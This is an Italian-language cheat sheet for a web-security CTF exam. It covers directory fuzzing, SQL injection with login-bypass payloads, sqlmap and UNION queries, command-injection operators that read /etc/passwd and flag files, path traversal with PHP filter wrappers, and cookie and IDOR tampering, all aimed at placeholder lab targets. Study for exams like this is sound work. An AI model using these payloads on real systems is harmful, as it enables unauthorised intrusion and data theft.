Markdown
# Supporto CTF Web Security - Esame Cybersecurity

## INDICE DEGLI ESERCIZI

1. [Recon & Fuzzing (Identificazione Pagine Nascoste)](#1)
2. [SQL Injection (Bypass Login e SQLMap)](#2)
3. [Command Injection (Esecuzione Comandi di Sistema)](#3)
4. [Local File Inclusion & Path Traversal (Lettura File)](#4)
5. [Broken Authentication & IDOR (Manipolazione Privilegi)](#5)

---

## 1

Prima di attaccare, è fondamentale mappare l'applicazione alla ricerca di file dimenticati, backup o directory nascoste (es. `config.php.bak`, `flag.txt`, `admin.php`).

### Ispezione Rapida con Curl
bash
# Mostra la pagina inclusi gli Header HTTP (cerca cookie strani o commenti nel server)
curl -i http://TARGET_IP/

# Invia una richiesta POST rapida
curl -X POST -d "username=admin&password=admin" http://TARGET_IP/login.php
Directory Brute-Forcing con DIRB / Gobuster
Se sulla macchina del laboratorio sono presenti questi tool, usali subito per trovare file nascosti:

Bash
# Utilizzo di DIRB (wordlist di default)
dirb http://TARGET_IP/ /usr/share/wordlists/dirb/common.txt

# Utilizzo di Gobuster (specifico per estensioni come .php, .txt, .bak)
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html
2
Si verifica quando l'input dell'utente viene concatenato direttamente in una query SQL (es. form di login, barre di ricerca, parametri ?id=1).

Bypass del Login (Authentication Bypass)
Inserisci questi payload direttamente nei campi Username o Password del form web:

' OR 1=1 -- -

' OR '1'='1

admin' -- -

admin' #

Sfruttamento tramite SQLMAP (Automazione)
Se il tool è installato, automatizza l'estrazione della flag senza farlo a mano:

Bash
# 1. Trova i nomi dei Database presenti
sqlmap -u "http://TARGET_IP/index.php?id=1" --dbs --batch

# 2. Trova le tabelle del database specifico (es. se trovi un DB chiamato 'cysec_db')
sqlmap -u "http://TARGET_IP/index.php?id=1" -D cysec_db --tables --batch

# 3. Estrai il contenuto (Dump) della tabella che ispira fiducia (es. 'users' o 'flags')
sqlmap -u "http://TARGET_IP/index.php?id=1" -D cysec_db -T flags --dump --batch
Sfruttamento Manuale (UNION Based)
Se devi farlo a mano in una barra di ricerca o parametro URL:

SQL
-- 1. Trova il numero di colonne (incrementa finché non dà errore)
' ORDER BY 1 -- -
' ORDER BY 2 -- -

-- 2. Identifica quali colonne stampano a schermo
' UNION SELECT 1,2,3 -- -

-- 3. Estrai i nomi delle tabelle (es. su MySQL)
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -

-- 4. Leggi direttamente un file sul server (se i privilegi del DB lo consentono)
' UNION SELECT null, LOAD_FILE('/var/www/html/flag.txt') -- -
3
Si verifica quando il sito prende un input e lo passa a una shell di sistema (es. form per fare il "ping" a un host, form per tracciare spedizioni).

Operatori di Concatenazione in Bash
Inserisci l'input richiesto (es. un IP) seguito da un operatore e dal comando per leggere la flag:

Punto e virgola (esegue dopo): 8.8.8.8 ; cat /flag.txt

AND logico (esegue se il primo riesce): 8.8.8.8 && cat flag.txt

OR logico (esegue se il primo fallisce): invalid_input || cat /var/www/html/flag.txt

Pipe (passa l'output): 8.8.8.8 | cat /etc/passwd

Iniezione in linea: $(cat /flag.txt) oppure `cat /flag.txt`

Comandi utili da lanciare se inietti con successo:
Bash
whoami          # Per capire che utente sei (es. www-data)
ls -la          # Elenca i file nella cartella corrente (cerca .txt nascosti)
find / -name "*flag*" 2>/dev/null  # Cerca ovunque nel sistema file con la parola flag
4
Si verifica quando l'applicazione include file locali basandosi su un parametro dell'utente (es. site.com/index.php?page=welcome.html).

Payload di Navigazione (Path Traversal)
Modifica il valore del parametro nell'URL provando a risalire l'albero delle directory:

http://TARGET_IP/index.php?page=../../../../etc/passwd (Verifica se funziona)

http://TARGET_IP/index.php?page=../../../../flag.txt

http://TARGET_IP/index.php?page=../../../../var/www/html/flag.txt

http://TARGET_IP/index.php?page=../../../../home/studente/flag.txt

Bypass Comuni se ci sono filtri deboli:
Filtro che elimina ../: Prova a raddoppiarlo: ....//....//....//etc/passwd

Uso dei PHP Wrappers (per leggere codice sorgente oscurato):
?page=php://filter/convert.base64-encode/resource=config.php

(Ti restituirà una stringa in Base64 del codice sorgente di config.php; copiala e decodificala sul tuo terminale con echo "STRINGA" | base64 -d).

5
Si verifica quando il controllo degli accessi si basa su dati modificabili dal client o su logiche manipolabili nei Cookie/Sorgente.

Ispezione e Manipolazione dei Cookie (F12 Developer Tools)
Apri la pagina del sito nel browser.

Premi F12 (o tasto destro -> Ispeziona) e vai sulla scheda Application (Chrome) o Storage (Firefox) -> Cookies.

Cerca valori sospetti e modificali facendo doppio clic:

user=studente -> Cambia in user=admin o user=root

isAdmin=false -> Cambia in isAdmin=true

role=user -> Cambia in role=administrator

Ricarica la pagina (F5).

Insecure Direct Object Reference (IDOR)
Controlla se l'URL espone degli identificativi numerici o testuali per mostrare dati privati:

Se l'URL è http://TARGET_IP/profile.php?id=14, prova a modificarlo manualmente in ?id=1, ?id=0 o ?id=2 per vedere se accedi ai profili o ai file di altri utenti (tra cui l'amministratore).
